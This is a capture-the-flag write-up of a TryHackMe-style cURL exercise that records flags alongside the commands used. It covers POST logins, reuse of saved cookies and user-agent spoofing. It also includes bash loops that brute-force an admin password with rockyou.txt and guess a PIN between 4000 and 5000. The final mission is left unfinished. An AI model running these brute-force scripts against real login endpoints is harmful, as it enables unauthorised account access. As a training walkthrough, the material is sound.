# Exploitation with cURL - Hoperation Eggsploit

### Answer the questions below

Make a¬†**POST**¬†request to the¬†`/post.php`¬†endpoint with the¬†**username**¬†`admin`¬†and the¬†**password**¬†`admin`. What is the flag you receive?

> **`THM{curl_post_success}`**
> 

```bash
## -X POST tells curl to use the POST method and -d defines the data we are sending in the body of the request 

$ curl -X POST -d "username=admin&password=admin" http://10.80.176.236/post.php
Login successful!
Flag: THM{curl_post_success}
```

---

Make a request to the¬†`/cookie.php`¬†endpoint with the¬†**username**¬†`admin`¬†and the¬†**password**¬†`admin`¬†and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?

> `THM{session_cookie_master}`
> 

```bash
**## 1. Save the cookies with -c option
$ curl -X POST -c cookies.txt -d "username=admin&password=admin" http://10.80.176.236/cookie.php 

## 2. Reuse the saved cookie with -b option**
$ curl -b cookies.txt http://10.80.176.236/cookie.php
Welcome back, admin!
Flag: THM{session_cookie_master}
```

---

After doing the brute force on the¬†`/bruteforce.php`¬†endpoint, what is the password of the¬†`admin`¬†user?

> `secretpass`
> 

```bash
## Create a password.txt file
$ vi passwords.txt
$ cat passwords.txt 
admin123
password
letmein
secretpass
secret

##Create a simple bash loop to try each password against bruteforce.php
$ vi loop.sh  
**$ cat loop.sh      
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.80.176.236/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done

##Add the execute permission to the script**  
$ chmod +x loop.sh  

##Run the script                        
$ ./loop.sh 
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass
```

---

Make a request to the¬†`/agent.php`¬†endpoint with the user-agent¬†`TBFC`. What is the flag your receive?

```bash
## Specify the custom user-agent using -A flag and confirm the check by showing headers using -i 
$ curl -i -A "TBFC" http://10.80.176.236/agent.php       
HTTP/1.1 200 OK
Date: Fri, 26 Dec 2025 05:48:57 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 38
Content-Type: text/html; charset=UTF-8

Flag: THM{user_agent_filter_bypassed}
```

---

**Bonus question**: Can you solve the Final Mission and get the flag?

<aside>
üí°

Tried bruteforcing but couldn‚Äôt find the password. Too much time needed.

</aside>

<aside>
üí°

**Hint:**¬†Use rockyou.txt when brute forcing for the password (only for the bonus mission). The PIN is between 4000 and 5000.

**Server**:¬†`http://10.80.176.236/terminal.php?action=panel`

</aside>

1. Identify endpoints:
    
    ```bash
    curl http://10.80.176.236/terminal.php?action=panel   
    <h2>Access denied</h2><p>This admin panel is terminal-only and is only accessible using secretcomputer</p>  
    ```
    
2. Since it is only accessible with user-agent ‚Äú`secretcomputer`‚Äù, we use `-A` flag:      
    
    ```bash
    ‚îÄ$ curl http://10.80.176.236/terminal.php?action=panel -A "secretcomputer"
    {
        "service": "Wormhole Control Panel",
        "endpoints": {
            "\/terminal.php?action=info": "Public info",
            "\/terminal.php?action=login": "POST: username,password",
            "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
            "\/terminal.php?action=status": "GET: wormhole status",
            "\/terminal.php?action=close": "POST: close wormhole"
        },
        "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
    }  
    ```
    
3. Looking at the public info:
    
    ```bash
    ‚îÄ$ curl http://10.80.176.236/terminal.php?action=info -A "secretcomputer"
    {
        "title": "Bunny Control Panel",
        "desc": "The rabbits hide the wormhole state and protect closure behind both a session and a token. You will need to authenticate and obtain the operator token."
    }   
    ```
    
4. To authenticate, we need to bruteforce using rockyou.txt modifying `loop.sh` as:
    
    ```bash
    for pass in $(cat /usr/share/wordlists/rockyou.txt); do
        echo "Trying password: $pass"
        response=$(curl -s -X POST \
            -d "username=admin&password=$pass" \
            -A "secretcomputer" \
            "http://10.80.176.236/terminal.php?action=login")
        
        if echo "$response" | grep -q "Welcome" || echo "$response" | grep -q '"status":"success"'; then
            echo "[+] Password found: $pass"
            break
        fi
    done  
    ```
    
5. After finding the password, save the cookie as:
6. To find the pin we create a script as:
    
    ```bash
    # After login success, use the auth token/session
    for pin in {4000..5000}; do
        echo "Trying PIN: $pin"
        response=$(curl -s -X POST -d "pin=$pin" -A "secretcomputer" \
            -b cookie.txt \
            "http://10.80.176.236/terminal.php?action=pin")
        
        if echo "$response" | grep -q "token" || echo "$response" | grep -q "success"; then
            echo "[+] PIN FOUND: $pin"
            break
        fi
    done
    ```
    
7. Check status:
    
    ```bash
    curl "http://10.80.176.236/terminal.php?action=status" -A "secretcomputer"
    ```
    
8. Close wormhole: Use operator token from PIN + session from login.